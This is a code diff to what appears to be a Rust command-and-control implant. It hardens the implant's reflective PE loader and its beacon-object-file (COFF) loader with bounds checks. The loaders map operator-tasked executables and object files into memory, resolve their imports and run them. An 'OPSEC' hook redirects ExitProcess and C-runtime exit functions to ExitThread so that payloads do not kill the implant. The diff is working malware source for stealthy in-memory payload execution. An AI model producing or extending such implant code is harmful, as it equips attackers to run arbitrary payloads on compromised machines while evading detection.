@@ -106,6 +106,33 @@ pub mod pe_loader {
     const IMAGE_DIRECTORY_ENTRY_BASERELOC: usize = 5;
     const IMAGE_DIRECTORY_ENTRY_IMPORT: usize = 1;
 
+    /// Returns `true` when `[offset, offset + len)` lies fully inside `limit`.
+    ///
+    /// Every offset/RVA below comes from tasking-supplied PE bytes and must be
+    /// validated against the source buffer (`pe_bytes.len()`) for reads from
+    /// the file, and against `image_size` for reads/writes in the mapped image.
+    /// All arithmetic is checked so a hostile value can't wrap the comparison.
+    #[inline]
+    fn range_ok(offset: usize, len: usize, limit: usize) -> bool {
+        offset.checked_add(len).map_or(false, |end| end <= limit)
+    }
+
+    /// Bounded C-string read from the mapped image. Scans for the NUL
+    /// terminator within `image_size` so a malformed RVA can't send
+    /// `CStr::from_ptr` on an unbounded out-of-bounds scan.
+    unsafe fn cstr_in_image<'a>(
+        base: *const u8,
+        image_size: usize,
+        rva: usize,
+    ) -> Option<&'a std::ffi::CStr> {
+        if rva >= image_size {
+            return None;
+        }
+        let bytes = std::slice::from_raw_parts(base.add(rva), image_size - rva);
+        let nul = bytes.iter().position(|&b| b == 0)?;
+        Some(std::ffi::CStr::from_bytes_with_nul_unchecked(&bytes[..=nul]))
+    }
+
     /// Manually map a PE (EXE or DLL) into memory and call its entry point.
     /// For DLLs this calls DllMain(DLL_PROCESS_ATTACH). For EXEs it calls
     /// the entry point on a new thread and returns immediately.
@@ -119,8 +146,13 @@ pub mod pe_loader {
         let dos = &*(pe_bytes.as_ptr() as *const ImageDosHeader);
         if dos.e_magic != 0x5A4D { return Err("Invalid DOS signature".into()); }
 
+        // e_lfanew is a signed i32: a negative value sign-extends to a huge
+        // usize, the old `nt_offset + size > len` check wrapped around, and the
+        // NT-header deref went out of bounds. Reject negatives outright and do
+        // the end-of-header computation with checked arithmetic.
+        if dos.e_lfanew < 0 { return Err("Invalid NT header offset (negative e_lfanew)".into()); }
         let nt_offset = dos.e_lfanew as usize;
-        if nt_offset + mem::size_of::<ImageNtHeaders64>() > pe_bytes.len() {
+        if !range_ok(nt_offset, mem::size_of::<ImageNtHeaders64>(), pe_bytes.len()) {
             return Err("Invalid NT header offset".into());
         }
         let nt = &*(pe_bytes.as_ptr().add(nt_offset) as *const ImageNtHeaders64);
@@ -128,7 +160,28 @@ pub mod pe_loader {
         if nt.optional_header.magic != 0x20B { return Err("Only PE32+ (x64) supported".into()); }
 
         let image_size = nt.optional_header.size_of_image as usize;
+        let header_size = nt.optional_header.size_of_headers as usize;
         let preferred_base = nt.optional_header.image_base;
+
+        // The headers are part of the image, so a PE whose SizeOfHeaders exceeds
+        // SizeOfImage is malformed — the header copy would otherwise write past
+        // the VirtualAlloc'd region.
+        if image_size == 0 || header_size > image_size {
+            return Err("Invalid SizeOfImage/SizeOfHeaders".into());
+        }
+
+        // Section headers live right after the optional header. Validate the
+        // ENTIRE table against the file size once, up front, so every
+        // per-section read below (the copy loop AND the protection loop) is
+        // guaranteed in bounds. Uses checked arithmetic throughout.
+        let section_count = nt.file_header.number_of_sections as usize;
+        let sections_offset = nt_offset
+            .checked_add(4 + mem::size_of::<ImageFileHeader>() + nt.file_header.size_of_optional_header as usize)
+            .ok_or_else(|| "Invalid section table offset".to_string())?;
+        // number_of_sections is a u16, so the multiply cannot overflow usize.
+        if !range_ok(sections_offset, section_count * mem::size_of::<ImageSectionHeader>(), pe_bytes.len()) {
+            return Err("Section table outside of PE buffer".into());
+        }
 
         // 1. Allocate memory for the image
         let base = VirtualAlloc(
@@ -144,17 +197,16 @@ pub mod pe_loader {
 
         if base.is_null() { return Err("VirtualAlloc failed".into()); }
 
-        // 2. Copy headers
-        let header_size = nt.optional_header.size_of_headers as usize;
-        ptr::copy_nonoverlapping(pe_bytes.as_ptr(), base as *mut u8, header_size.min(pe_bytes.len()));
+        // 2. Copy headers — capped by BOTH the file size and the allocated
+        // image size (SizeOfHeaders > SizeOfImage is rejected above; the clamp
+        // stays as defense-in-depth).
+        ptr::copy_nonoverlapping(
+            pe_bytes.as_ptr(),
+            base as *mut u8,
+            header_size.min(pe_bytes.len()).min(image_size),
+        );
 
-        // 3. Copy sections
-        let section_count = nt.file_header.number_of_sections as usize;
-        let sections_offset = nt_offset
-            + 4  // signature
-            + mem::size_of::<ImageFileHeader>()
-            + nt.file_header.size_of_optional_header as usize;
-
+        // 3. Copy sections (section-table reads are in bounds — validated above)
         for i in 0..section_count {
             let sec = &*(pe_bytes.as_ptr().add(sections_offset + i * mem::size_of::<ImageSectionHeader>()) as *const ImageSectionHeader);
             if sec.size_of_raw_data == 0 { continue; }
@@ -164,7 +216,7 @@ pub mod pe_loader {
             // Validate BOTH source and destination bounds to prevent heap overflow
             // from malformed PE sections specifying out-of-range virtual addresses
             if src_offset + copy_size <= pe_bytes.len()
-                && dst_offset.checked_add(copy_size).map_or(false, |end| end <= image_size)
+                && range_ok(dst_offset, copy_size, image_size)
             {
                 ptr::copy_nonoverlapping(
                     pe_bytes.as_ptr().add(src_offset),
@@ -176,7 +228,9 @@ pub mod pe_loader {
 
         // 4. Process base relocations
         let delta = (base as u64).wrapping_sub(preferred_base) as i64;
-        if delta != 0 {
+        if delta != 0
+            && nt.optional_header.number_of_rva_and_sizes > IMAGE_DIRECTORY_ENTRY_BASERELOC as u32
+        {
             let data_dir_offset = nt_offset
                 + 4 + mem::size_of::<ImageFileHeader>()
                 + 112; // offset to DataDirectory in OptionalHeader64
@@ -185,134 +239,217 @@ pub mod pe_loader {
             // is within the PE buffer. Malformed/compacted PEs with a smaller
             // optional header would cause OOB reads without this.
             let reloc_entry_offset = data_dir_offset + IMAGE_DIRECTORY_ENTRY_BASERELOC * 8;
-            if reloc_entry_offset + 8 > pe_bytes.len() {
-                // No relocation directory — skip (PE may be position-independent)
-            } else {
+            if range_ok(reloc_entry_offset, 8, pe_bytes.len()) {
                 let reloc_dir = &*(pe_bytes.as_ptr().add(reloc_entry_offset) as *const ImageDataDirectory);
 
-            if reloc_dir.virtual_address != 0 && reloc_dir.size != 0 {
-                let mut offset = 0u32;
-                while offset < reloc_dir.size {
-                    let block = &*((base as *const u8).add((reloc_dir.virtual_address + offset) as usize) as *const ImageBaseRelocation);
-                    if block.size_of_block == 0 { break; }
-                    let entry_count = (block.size_of_block as usize - 8) / 2;
-                    let entries = std::slice::from_raw_parts(
-                        (base as *const u8).add((reloc_dir.virtual_address + offset + 8) as usize) as *const u16,
-                        entry_count,
-                    );
-                    for &entry in entries {
-                        let reloc_type = entry >> 12;
-                        let reloc_offset = (entry & 0x0FFF) as u32;
-                        if reloc_type == 10 { // IMAGE_REL_BASED_DIR64
-                            let patch_addr = (base as *mut u8).add((block.virtual_address + reloc_offset) as usize) as *mut u64;
-                            *patch_addr = (*patch_addr as i64 + delta) as u64;
+                if reloc_dir.virtual_address != 0 && reloc_dir.size != 0 {
+                    let reloc_rva = reloc_dir.virtual_address as usize;
+                    let reloc_size = reloc_dir.size as usize;
+                    let mut offset = 0usize;
+
+                    while offset < reloc_size {
+                        // reloc_rva/reloc_size are u32-sized, so this sum cannot
+                        // overflow usize; every access below is checked against
+                        // image_size before touching the mapped image.
+                        let block_rva = reloc_rva + offset;
+
+                        // Block header (8 bytes) must be readable from the image.
+                        if !range_ok(block_rva, mem::size_of::<ImageBaseRelocation>(), image_size) {
+                            VirtualFree(base, 0, MEM_RELEASE);
+                            return Err("Relocation block outside mapped image".into());
                         }
+                        let block = &*((base as *const u8).add(block_rva) as *const ImageBaseRelocation);
+                        if block.size_of_block == 0 { break; }
+                        let block_size = block.size_of_block as usize;
+
+                        // size_of_block < 8 would underflow `(block_size - 8) / 2`
+                        // into a huge entry count (OOB read/write). The whole
+                        // block must also fit inside the mapped image.
+                        if block_size < 8 || !range_ok(block_rva, block_size, image_size) {
+                            VirtualFree(base, 0, MEM_RELEASE);
+                            return Err("Malformed relocation block size".into());
+                        }
+
+                        let entry_count = (block_size - 8) / 2;
+                        // Entries occupy [block_rva + 8, block_rva + 8 + entry_count*2),
+                        // which is inside [block_rva, block_rva + block_size) —
+                        // already validated against image_size above.
+                        let entries = std::slice::from_raw_parts(
+                            (base as *const u8).add(block_rva + 8) as *const u16,
+                            entry_count,
+                        );
+                        for &entry in entries {
+                            let reloc_type = entry >> 12;
+                            let reloc_offset = (entry & 0x0FFF) as u32;
+                            if reloc_type == 10 { // IMAGE_REL_BASED_DIR64
+                                let patch_rva = block.virtual_address as usize + reloc_offset as usize;
+                                // The patched u64 must lie fully within the image;
+                                // the old code wrote through this pointer unchecked.
+                                if !range_ok(patch_rva, 8, image_size) {
+                                    VirtualFree(base, 0, MEM_RELEASE);
+                                    return Err("Relocation target outside mapped image".into());
+                                }
+                                let patch_addr = (base as *mut u8).add(patch_rva) as *mut u64;
+                                *patch_addr = (*patch_addr as i64 + delta) as u64;
+                            }
+                        }
+                        // block_size >= 8 (checked above) so the walk always advances.
+                        offset += block_size;
                     }
-                    offset += block.size_of_block;
                 }
             }
-            } // close bounds-check else
         }
 
         // 5. Resolve imports
-        let data_dir_offset = nt_offset + 4 + mem::size_of::<ImageFileHeader>() + 112;
-        let import_entry_offset = data_dir_offset + IMAGE_DIRECTORY_ENTRY_IMPORT * 8;
-        // Bounds check: verify the import data directory entry is within the PE buffer.
-        if import_entry_offset + 8 > pe_bytes.len() {
-            // No import directory at all (unusual but possible for shellcode-like PEs)
-        } else {
-        let import_dir = &*(pe_bytes.as_ptr().add(import_entry_offset) as *const ImageDataDirectory);
+        if nt.optional_header.number_of_rva_and_sizes > IMAGE_DIRECTORY_ENTRY_IMPORT as u32 {
+            let data_dir_offset = nt_offset + 4 + mem::size_of::<ImageFileHeader>() + 112;
+            let import_entry_offset = data_dir_offset + IMAGE_DIRECTORY_ENTRY_IMPORT * 8;
+            // Bounds check: verify the import data directory entry is within the PE buffer.
+            if range_ok(import_entry_offset, 8, pe_bytes.len()) {
+                let import_dir = &*(pe_bytes.as_ptr().add(import_entry_offset) as *const ImageDataDirectory);
 
-        if import_dir.virtual_address != 0 {
-            let mut desc_offset = 0usize;
-            loop {
-                let desc = &*((base as *const u8).add(import_dir.virtual_address as usize + desc_offset) as *const ImageImportDescriptor);
-                if desc.name == 0 { break; }
-
-                let dll_name_ptr = (base as *const u8).add(desc.name as usize);
-                let dll_name = std::ffi::CStr::from_ptr(dll_name_ptr as *const i8);
-                let h_module = LoadLibraryA(dll_name.as_ptr());
-                if h_module.is_null() {
-                    let name_str = dll_name.to_string_lossy();
-                    VirtualFree(base, 0, MEM_RELEASE);
-                    return Err(format!("Failed to load dependency: {}", name_str));
-                }
-
-                let mut thunk_offset = 0usize;
-                let olt_rva = if desc.original_first_thunk != 0 { desc.original_first_thunk } else { desc.first_thunk };
-                loop {
-                    let olt_entry = *((base as *const u8).add(olt_rva as usize + thunk_offset) as *const u64);
-                    if olt_entry == 0 { break; }
-
-                    let func_addr = if olt_entry & (1u64 << 63) != 0 {
-                        // Import by ordinal
-                        let ordinal = (olt_entry & 0xFFFF) as u16;
-                        GetProcAddress(h_module, ordinal as usize as *const i8)
-                    } else {
-                        // Import by name (skip 2-byte hint)
-                        let name_ptr = (base as *const u8).add(olt_entry as usize + 2);
-                        let func_name = std::ffi::CStr::from_ptr(name_ptr as *const i8);
-                        let resolved = GetProcAddress(h_module, func_name.as_ptr());
-
-                        // OPSEC: Redirect process-terminating functions → ExitThread
-                        // so EXEs running in the loader thread don't kill the agent.
-                        //
-                        // ExitProcess (kernel32) is the obvious one, but MSVC/UCRT
-                        // programs compiled with the C runtime usually exit via
-                        // exit(), _exit(), _cexit(), _c_exit(), or abort() from
-                        // msvcrt.dll / ucrtbase.dll. These call ExitProcess internally,
-                        // but the IAT hook on ExitProcess only catches calls through
-                        // the loaded PE's own import table — not calls from within
-                        // the CRT DLL. We must hook the CRT functions themselves.
-                        let fname_bytes = func_name.to_bytes();
-                        let is_exit_func = fname_bytes == b"ExitProcess"
-                            || fname_bytes == b"exit"
-                            || fname_bytes == b"_exit"
-                            || fname_bytes == b"_cexit"
-                            || fname_bytes == b"_c_exit"
-                            || fname_bytes == b"abort";
-
-                        if is_exit_func {
-                            let k32 = LoadLibraryA(b"kernel32.dll\0".as_ptr() as *const i8);
-                            let exit_thread = GetProcAddress(k32, b"ExitThread\0".as_ptr() as *const i8);
-                            if !exit_thread.is_null() { exit_thread } else { resolved }
-                        } else {
-                            resolved
+                if import_dir.virtual_address != 0 {
+                    let import_rva = import_dir.virtual_address as usize;
+                    let mut desc_offset = 0usize;
+                    loop {
+                        // The descriptor walk previously had NO bounds check —
+                        // every descriptor read is now validated against the
+                        // mapped image before it happens.
+                        let desc_rva = import_rva + desc_offset;
+                        if !range_ok(desc_rva, mem::size_of::<ImageImportDescriptor>(), image_size) {
+                            VirtualFree(base, 0, MEM_RELEASE);
+                            return Err("Import descriptor outside mapped image".into());
                         }
-                    };
+                        let desc = &*((base as *const u8).add(desc_rva) as *const ImageImportDescriptor);
+                        if desc.name == 0 { break; }
 
-                    // Guard: if GetProcAddress returned NULL, the function doesn't
-                    // exist in this DLL version. Writing NULL to the IAT would cause
-                    // a null-pointer dereference crash when the PE calls that API.
-                    if func_addr.is_null() {
-                        let name_info = if olt_entry & (1u64 << 63) != 0 {
-                            format!("ordinal {}", olt_entry & 0xFFFF)
-                        } else {
-                            let np = (base as *const u8).add(olt_entry as usize + 2);
-                            std::ffi::CStr::from_ptr(np as *const i8).to_string_lossy().into_owned()
+                        let dll_name = match cstr_in_image(base as *const u8, image_size, desc.name as usize) {
+                            Some(s) => s,
+                            None => {
+                                VirtualFree(base, 0, MEM_RELEASE);
+                                return Err("Import DLL name outside mapped image".into());
+                            }
                         };
-                        let dll_str = dll_name.to_string_lossy();
-                        VirtualFree(base, 0, MEM_RELEASE);
-                        return Err(format!("Import resolution failed: {}!{}", dll_str, name_info));
+                        let h_module = LoadLibraryA(dll_name.as_ptr());
+                        if h_module.is_null() {
+                            let name_str = dll_name.to_string_lossy();
+                            VirtualFree(base, 0, MEM_RELEASE);
+                            return Err(format!("Failed to load dependency: {}", name_str));
+                        }
+
+                        let mut thunk_offset = 0usize;
+                        let olt_rva = (if desc.original_first_thunk != 0 { desc.original_first_thunk } else { desc.first_thunk }) as usize;
+                        loop {
+                            // Each 8-byte thunk read is bounds-checked against
+                            // the mapped image (previously unchecked).
+                            let olt_entry_rva = olt_rva + thunk_offset;
+                            if !range_ok(olt_entry_rva, 8, image_size) {
+                                VirtualFree(base, 0, MEM_RELEASE);
+                                return Err("Import thunk outside mapped image".into());
+                            }
+                            let olt_entry = *((base as *const u8).add(olt_entry_rva) as *const u64);
+                            if olt_entry == 0 { break; }
+
+                            let func_addr = if olt_entry & (1u64 << 63) != 0 {
+                                // Import by ordinal
+                                let ordinal = (olt_entry & 0xFFFF) as u16;
+                                GetProcAddress(h_module, ordinal as usize as *const i8)
+                            } else {
+                                // Import by name (skip 2-byte hint) — bounded C-string
+                                // read so a hostile RVA can't scan out of bounds.
+                                let name_rva = match (olt_entry as usize).checked_add(2) {
+                                    Some(r) => r,
+                                    None => {
+                                        VirtualFree(base, 0, MEM_RELEASE);
+                                        return Err("Import name RVA overflow".into());
+                                    }
+                                };
+                                let func_name = match cstr_in_image(base as *const u8, image_size, name_rva) {
+                                    Some(s) => s,
+                                    None => {
+                                        VirtualFree(base, 0, MEM_RELEASE);
+                                        return Err("Import name outside mapped image".into());
+                                    }
+                                };
+                                let resolved = GetProcAddress(h_module, func_name.as_ptr());
+
+                                // OPSEC: Redirect process-terminating functions → ExitThread
+                                // so EXEs running in the loader thread don't kill the agent.
+                                //
+                                // ExitProcess (kernel32) is the obvious one, but MSVC/UCRT
+                                // programs compiled with the C runtime usually exit via
+                                // exit(), _exit(), _cexit(), _c_exit(), or abort() from
+                                // msvcrt.dll / ucrtbase.dll. These call ExitProcess internally,
+                                // but the IAT hook on ExitProcess only catches calls through
+                                // the loaded PE's own import table — not calls from within
+                                // the CRT DLL. We must hook the CRT functions themselves.
+                                let fname_bytes = func_name.to_bytes();
+                                let is_exit_func = fname_bytes == b"ExitProcess"
+                                    || fname_bytes == b"exit"
+                                    || fname_bytes == b"_exit"
+                                    || fname_bytes == b"_cexit"
+                                    || fname_bytes == b"_c_exit"
+                                    || fname_bytes == b"abort";
+
+                                if is_exit_func {
+                                    let k32 = LoadLibraryA(b"kernel32.dll\0".as_ptr() as *const i8);
+                                    let exit_thread = GetProcAddress(k32, b"ExitThread\0".as_ptr() as *const i8);
+                                    if !exit_thread.is_null() { exit_thread } else { resolved }
+                                } else {
+                                    resolved
+                                }
+                            };
+
+                            // Guard: if GetProcAddress returned NULL, the function doesn't
+                            // exist in this DLL version. Writing NULL to the IAT would cause
+                            // a null-pointer dereference crash when the PE calls that API.
+                            if func_addr.is_null() {
+                                let name_info = if olt_entry & (1u64 << 63) != 0 {
+                                    format!("ordinal {}", olt_entry & 0xFFFF)
+                                } else {
+                                    match (olt_entry as usize).checked_add(2) {
+                                        Some(r) => match cstr_in_image(base as *const u8, image_size, r) {
+                                            Some(s) => s.to_string_lossy().into_owned(),
+                                            None => "<invalid name RVA>".to_string(),
+                                        },
+                                        None => "<invalid name RVA>".to_string(),
+                                    }
+                                };
+                                let dll_str = dll_name.to_string_lossy();
+                                VirtualFree(base, 0, MEM_RELEASE);
+                                return Err(format!("Import resolution failed: {}!{}", dll_str, name_info));
+                            }
+
+                            // Patch the IAT — the write target is validated
+                            // against image_size first (previously unchecked).
+                            let iat_rva = desc.first_thunk as usize + thunk_offset;
+                            if !range_ok(iat_rva, 8, image_size) {
+                                VirtualFree(base, 0, MEM_RELEASE);
+                                return Err("IAT entry outside mapped image".into());
+                            }
+                            let iat_slot = (base as *mut u8).add(iat_rva) as *mut u64;
+                            *iat_slot = func_addr as u64;
+
+                            thunk_offset += 8;
+                        }
+
+                        desc_offset += mem::size_of::<ImageImportDescriptor>();
                     }
-
-                    // Patch the IAT
-                    let iat_slot = (base as *mut u8).add(desc.first_thunk as usize + thunk_offset) as *mut u64;
-                    *iat_slot = func_addr as u64;
-
-                    thunk_offset += 8;
                 }
-
-                desc_offset += mem::size_of::<ImageImportDescriptor>();
             }
         }
-        } // close import bounds-check else
 
-        // 6. Set section protections
+        // 6. Set section protections (table reads are in bounds — validated
+        // above; each protection range is clamped to the mapped image so a
+        // malformed section header can't make VirtualProtect touch memory
+        // past the allocation).
         for i in 0..section_count {
             let sec = &*(pe_bytes.as_ptr().add(sections_offset + i * mem::size_of::<ImageSectionHeader>()) as *const ImageSectionHeader);
-            let size = if sec.virtual_size > 0 { sec.virtual_size } else { sec.size_of_raw_data };
-            if size == 0 { continue; }
+            let raw_protect_size = if sec.virtual_size > 0 { sec.virtual_size } else { sec.size_of_raw_data } as usize;
+            if raw_protect_size == 0 { continue; }
+            let va = sec.virtual_address as usize;
+            if va >= image_size { continue; }
+            let size = raw_protect_size.min(image_size - va);
 
             let is_exec = sec.characteristics & 0x20000000 != 0;  // IMAGE_SCN_MEM_EXECUTE
             let is_write = sec.characteristics & 0x80000000 != 0; // IMAGE_SCN_MEM_WRITE
@@ -326,8 +463,8 @@ pub mod pe_loader {
 
             let mut old = 0u32;
             VirtualProtect(
-                (base as *mut u8).add(sec.virtual_address as usize) as *mut c_void,
-                size as usize,
+                (base as *mut u8).add(va) as *mut c_void,
+                size,
                 protect,
                 &mut old,
             );
@@ -339,6 +476,12 @@ pub mod pe_loader {
         let entry_rva = nt.optional_header.address_of_entry_point as usize;
         if entry_rva == 0 {
             return Ok(format!("PE mapped at 0x{:X} (no entry point)", base as usize));
+        }
+        // A hostile AddressOfEntryPoint would otherwise make us call memory
+        // outside the mapped image.
+        if entry_rva >= image_size {
+            VirtualFree(base, 0, MEM_RELEASE);
+            return Err("Entry point outside mapped image".into());
         }
 
         let is_dll = nt.file_header.characteristics & 0x2000 != 0; // IMAGE_FILE_DLL
@@ -551,14 +694,67 @@ pub mod bof {
         let num_sections = header.number_of_sections as usize;
         let sections_offset = mem::size_of::<CoffHeader>() + header.size_of_optional_header as usize;
 
-        // Parse sections
-        let mut section_data: Vec<(*mut u8, usize)> = Vec::new();
-        let mut total_size = 0usize;
+        // ── Up-front bounds validation ──────────────────────────────────
+        // Every offset in a COFF comes from tasking-supplied bytes. Validate
+        // all table extents against coff_bytes.len() BEFORE allocating, so a
+        // malformed object can't drive out-of-bounds table reads (the old code
+        // read the section/symbol/relocation tables completely unchecked).
 
+        // Section table: [sections_offset, sections_offset + num_sections * 40)
+        let sec_table_bytes = num_sections
+            .checked_mul(mem::size_of::<CoffSection>())
+            .ok_or_else(|| "COFF section table size overflow".to_string())?;
+        if sections_offset.checked_add(sec_table_bytes).map_or(true, |end| end > coff_bytes.len()) {
+            return Err("COFF section table out of bounds".into());
+        }
+
+        // Symbol table: [sym_table_offset, string_table_offset), 18 bytes/symbol.
+        // The string table begins immediately after the symbol table.
+        let sym_table_offset = header.pointer_to_symbol_table as usize;
+        let num_symbols = header.number_of_symbols as usize;
+        let sym_table_bytes = num_symbols
+            .checked_mul(18) // 18 bytes per symbol
+            .ok_or_else(|| "COFF symbol table size overflow".to_string())?;
+        let string_table_offset = sym_table_offset
+            .checked_add(sym_table_bytes)
+            .ok_or_else(|| "COFF symbol table offset overflow".to_string())?;
+        if string_table_offset > coff_bytes.len() {
+            return Err("COFF symbol table out of bounds".into());
+        }
+
+        // Per-section relocation tables (reads validated once, up front).
         for i in 0..num_sections {
             let sec = *(coff_bytes.as_ptr().add(sections_offset + i * mem::size_of::<CoffSection>()) as *const CoffSection);
-            let size = if sec.size_of_raw_data > 0 { sec.size_of_raw_data as usize } else { sec.virtual_size as usize };
-            total_size += (size + 0xFFF) & !0xFFF; // page-align
+            let num_relocs = sec.number_of_relocations as usize;
+            if num_relocs == 0 { continue; }
+            let reloc_bytes = num_relocs
+                .checked_mul(mem::size_of::<CoffReloc>())
+                .ok_or_else(|| "COFF relocation table size overflow".to_string())?;
+            let reloc_end = (sec.pointer_to_relocations as usize)
+                .checked_add(reloc_bytes)
+                .ok_or_else(|| "COFF relocation table offset overflow".to_string())?;
+            if reloc_end > coff_bytes.len() {
+                return Err("COFF relocation table out of bounds".into());
+            }
+        }
+
+        // Per-section in-memory footprint. This MUST be identical in the
+        // sizing pass and the copy/relocation passes: the old code summed
+        // `(raw > 0) ? raw : virtual` here but advanced the copy pass by
+        // `max(raw, virtual)` — sections with virtual_size > size_of_raw_data > 0
+        // made the copy and relocation writes run past the allocation.
+        let section_footprint = |sec: &CoffSection| -> usize {
+            let span = (sec.size_of_raw_data as usize).max(sec.virtual_size as usize);
+            (span + 0xFFF) & !0xFFF // page-align
+        };
+
+        // First pass: compute total allocation size.
+        // (num_sections <= u16::MAX and each footprint < 2^33, so the sum
+        // cannot overflow usize on 64-bit.)
+        let mut total_size = 0usize;
+        for i in 0..num_sections {
+            let sec = *(coff_bytes.as_ptr().add(sections_offset + i * mem::size_of::<CoffSection>()) as *const CoffSection);
+            total_size += section_footprint(&sec);
         }
 
         // Allocate one big RWX block for simplicity.
@@ -592,50 +788,69 @@ pub mod bof {
         if base.is_null() { return Err("VirtualAlloc failed for BOF".into()); }
         let mut trampoline_offset = total_size; // first trampoline starts right after sections
 
+        let mut section_data: Vec<(*mut u8, usize)> = Vec::new();
         let mut current_offset = 0usize;
         for i in 0..num_sections {
             let sec = *(coff_bytes.as_ptr().add(sections_offset + i * mem::size_of::<CoffSection>()) as *const CoffSection);
             let raw_size = sec.size_of_raw_data as usize;
+            let aligned = section_footprint(&sec);
+            // current_offset is the sum of the same footprints that produced
+            // total_size, and raw_size <= aligned, so this stays inside the
+            // allocation.
             let sec_base = (base as *mut u8).add(current_offset);
 
-            if raw_size > 0 && (sec.pointer_to_raw_data as usize + raw_size) <= coff_bytes.len() {
-                ptr::copy_nonoverlapping(
-                    coff_bytes.as_ptr().add(sec.pointer_to_raw_data as usize),
-                    sec_base,
-                    raw_size,
-                );
+            if raw_size > 0 {
+                let src = sec.pointer_to_raw_data as usize;
+                if src.checked_add(raw_size).map_or(false, |end| end <= coff_bytes.len()) {
+                    ptr::copy_nonoverlapping(
+                        coff_bytes.as_ptr().add(src),
+                        sec_base,
+                        raw_size,
+                    );
+                } else {
+                    // Malformed section raw-data pointer: fail closed instead
+                    // of silently running a half-mapped BOF.
+                    VirtualFree(base, 0, MEM_RELEASE);
+                    return Err("COFF section raw data out of bounds".into());
+                }
             }
 
-            let aligned = (raw_size.max(sec.virtual_size as usize) + 0xFFF) & !0xFFF;
             section_data.push((sec_base, aligned));
             current_offset += aligned;
         }
 
-        // Parse symbol table
-        let sym_table_offset = header.pointer_to_symbol_table as usize;
-        let num_symbols = header.number_of_symbols as usize;
-        let string_table_offset = sym_table_offset + num_symbols * 18; // 18 bytes per symbol
-
-        let get_symbol_name = |sym: &CoffSymbol| -> String {
+        // Symbol/string-table offsets were validated up front.
+        let get_symbol_name = |sym: &CoffSymbol| -> Option<String> {
             if sym.name[0..4] == [0, 0, 0, 0] {
-                // Name is in string table
+                // Name is in the string table. The offset is untrusted: the old
+                // code sliced `coff_bytes[start..]` unchecked (panic → abort with
+                // panic="abort", killing the implant). Bounds-check the start and
+                // scan for the NUL terminator WITHIN the buffer.
                 let str_offset = u32::from_le_bytes([sym.name[4], sym.name[5], sym.name[6], sym.name[7]]) as usize;
-                let start = string_table_offset + str_offset;
-                let end = coff_bytes[start..].iter().position(|&b| b == 0).unwrap_or(0) + start;
-                String::from_utf8_lossy(&coff_bytes[start..end]).to_string()
+                let start = string_table_offset.checked_add(str_offset)?;
+                if start > coff_bytes.len() { return None; }
+                let tail = &coff_bytes[start..];
+                let end = tail.iter().position(|&b| b == 0).unwrap_or(tail.len());
+                Some(String::from_utf8_lossy(&tail[..end]).to_string())
             } else {
                 let end = sym.name.iter().position(|&b| b == 0).unwrap_or(8);
-                String::from_utf8_lossy(&sym.name[..end]).to_string()
+                Some(String::from_utf8_lossy(&sym.name[..end]).to_string())
             }
         };
 
-        // Build symbol address map
+        // Build symbol address map (symbol-table reads are in bounds — validated above)
         let mut symbol_addrs: Vec<u64> = Vec::with_capacity(num_symbols);
         let mut go_addr: Option<*const u8> = None;
         let mut i = 0;
         while i < num_symbols {
             let sym = *(coff_bytes.as_ptr().add(sym_table_offset + i * 18) as *const CoffSymbol);
-            let name = get_symbol_name(&sym);
+            let name = match get_symbol_name(&sym) {
+                Some(n) => n,
+                None => {
+                    VirtualFree(base, 0, MEM_RELEASE);
+                    return Err("COFF string table out of bounds".into());
+                }
+            };
 
             let addr = if sym.section_number > 0 {
                 let sec_idx = (sym.section_number - 1) as usize;
@@ -661,7 +876,8 @@ pub mod bof {
             }
         }
 
-        // Process relocations
+        // Process relocations (section and relocation table reads are in
+        // bounds — validated up front)
         for i in 0..num_sections {
             let sec = *(coff_bytes.as_ptr().add(sections_offset + i * mem::size_of::<CoffSection>()) as *const CoffSection);
             let num_relocs = sec.number_of_relocations as usize;
@@ -669,13 +885,34 @@ pub mod bof {
 
             let reloc_base = sec.pointer_to_relocations as usize;
             let sec_base = section_data[i].0;
+            let sec_footprint = section_data[i].1;
 
             for r in 0..num_relocs {
                 let reloc = *(coff_bytes.as_ptr().add(reloc_base + r * mem::size_of::<CoffReloc>()) as *const CoffReloc);
                 let sym_idx = reloc.symbol_table_index as usize;
                 if sym_idx >= symbol_addrs.len() { continue; }
                 let sym_addr = symbol_addrs[sym_idx];
-                let patch_site = sec_base.add(reloc.virtual_address as usize);
+
+                // The patch site comes from a raw u32 in untrusted input — the
+                // old code wrote through it with no bounds check (OOB write).
+                // Validate it against THIS section's allocated footprint first.
+                let patch_rva = reloc.virtual_address as usize;
+                let patch_size = match reloc.reloc_type {
+                    IMAGE_REL_AMD64_ADDR64 => 8usize,
+                    IMAGE_REL_AMD64_ADDR32NB | IMAGE_REL_AMD64_REL32 => 4usize,
+                    _ => continue, // Skip unsupported relocation types
+                };
+                if patch_rva.checked_add(patch_size).map_or(true, |end| end > sec_footprint) {
+                    VirtualFree(base, 0, MEM_RELEASE);
+                    // NB: use the local `patch_rva` copy — referencing the packed
+                    // field `reloc.virtual_address` directly (as format! does)
+                    // is E0793 undefined behavior.
+                    return Err(format!(
+                        "BOF relocation site out of bounds: section {} rva 0x{:X}",
+                        i + 1, patch_rva
+                    ));
+                }
+                let patch_site = sec_base.add(patch_rva);
 
                 match reloc.reloc_type {
                     IMAGE_REL_AMD64_ADDR64 => {
@@ -702,7 +939,7 @@ pub mod bof {
                                 *(tramp.add(2) as *mut u64) = sym_addr;
                                 *tramp.add(10) = 0xFF;
                                 *tramp.add(11) = 0xE0;
-                                
+
                                 let tramp_dist = tramp as i64 - (patch_site as i64 + 4);
                                 *(patch_site as *mut i32) = tramp_dist as i32;
                                 trampoline_offset += TRAMPOLINE_SIZE;
@@ -716,7 +953,7 @@ pub mod bof {
                             }
                         }
                     }
-                    _ => {} // Skip unsupported relocation types
+                    _ => {} // unreachable — unsupported types skipped above
                 }
             }
         }
@@ -746,8 +983,7 @@ pub mod bof {
         let args_ptr = args_data.as_ptr() as usize;
         let args_len = args_data.len() as i32;
         let go_addr = go as usize;
-        let base_addr = base as usize;
-        
+
         let handle = std::thread::spawn(move || -> Result<(), String> {
             unsafe {
                 let tid = GetCurrentThreadId();
